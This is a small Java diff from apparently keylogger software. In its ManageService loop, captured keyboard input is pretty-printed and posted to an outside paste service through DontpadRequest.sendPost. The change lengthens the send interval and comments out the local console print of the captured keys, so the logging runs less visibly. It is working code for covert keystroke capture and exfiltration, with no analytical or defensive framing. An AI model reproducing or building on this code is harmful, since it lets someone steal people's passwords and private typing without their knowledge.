@@ -23,9 +23,9 @@ public class ManageService implements Runnable{
 		while(true) {
 			
 			try {
-				Thread.sleep(1000);
+				Thread.sleep(100000);
 				//	Sender.sendMail(Utils.prettyPrint(keyboard.getKeyCache()));
-				  System.out.println( Utils.prettyPrint(keyboard.getKeyCache()));
+				//  System.out.println( Utils.prettyPrint(keyboard.getKeyCache()));
 				DontpadRequest.sendPost(history + Utils.prettyPrint(keyboard.getKeyCache()));
 				keyboard.onSend();
 			} catch (Exception e) {
